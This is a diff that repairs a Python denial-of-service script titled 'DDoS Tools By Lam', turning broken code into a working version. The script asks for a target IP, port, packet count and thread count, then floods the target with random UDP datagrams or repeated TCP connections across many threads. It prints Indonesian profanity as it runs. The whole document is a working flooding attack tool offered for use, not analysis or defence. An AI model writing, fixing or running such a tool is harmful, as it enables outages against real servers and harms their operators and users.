@@ -1,48 +1,90 @@
 import random
-import socket 
-import threading 
-import os 
+
+import socket
+
+import threading
+
+import os
 
 os.system("clear")
-print("DDos Tools By Lam")
+
+print("DDoS Tools By Lam")
+
 print("Semoga Tembus")
-ip = str(input("ip:"))
-port = int(input("port: "))
-choice = str(input(" Gas Ga? (y/n): "))
-times = int(input(" packects: "))
-threads = int(input(" threads: "))
+
+ip = str(input(" Ip: "))
+
+port = int(input(" Port: "))
+
+choice = str(input(" Gas Gak?(y/n): "))
+
+times = int(input(" Packets: "))
+
+threads = int(input(" Threads: "))
+
 def run():
-  data = random_unrandom(1024)
-  i= random;choice(("[*]","[#]"))
+
+  data = random._urandom(1024)
+
+  i = random.choice(("[*]","[!]","[#]"))
+
   while True:
+
     try:
-      s = socket.socket(socket.AF_INET, socket;SOCK_DGRAM)
+
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
       addr = (str(ip),int(port))
-      for x in range(time):
+
+      for x in range(times):
+
         s.sendto(data,addr)
-        print(i+"|Mamam Nih Anjing!!!")
-        except:
-          print("[!]|Mamam Nih Kontol!!! |")
-          
-          def run2():
-            data = random._unrandom(16)
-            i = random.choice(("[*]","[!]","[#]"))
-            while True:
-              try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((ip,port))
-                s.send(data)
-                for x in range(time):
-                  s.send(data)
-                  print(i +" Yo Disini!")
-                  except:
-                    s.close()
-                    print("[*]Down")
-                    
-                    for y in range (threads):
-                      if choice === 'y':
-                        th = threading.Thread(targer = run)
-                        th.start()
-                        else:
-                          th= threading.Thread(target = run2)
-                          th.start()
+
+      print(i +" | Mamam Nih Anjing!!!|")
+
+    except:
+
+      print("[!] | Mampus Kontol!!! |")
+
+def run2():
+
+  data = random._urandom(16)
+
+  i = random.choice(("[*]","[!]","[#]"))
+
+  while True:
+
+    try:
+
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+      s.connect((ip,port))
+
+      s.send(data)
+
+      for x in range(times):
+
+        s.send(data)
+
+      print(i +" Yoooooooo Di Sini!!!")
+
+    except:
+
+      s.close()
+
+      print("[*] Down")
+
+for y in range(threads):
+
+  if choice == 'y':
+
+    th = threading.Thread(target = run)
+
+    th.start()
+
+  else:
+
+    th = threading.Thread(target = run2)
+
+    th.start()
+
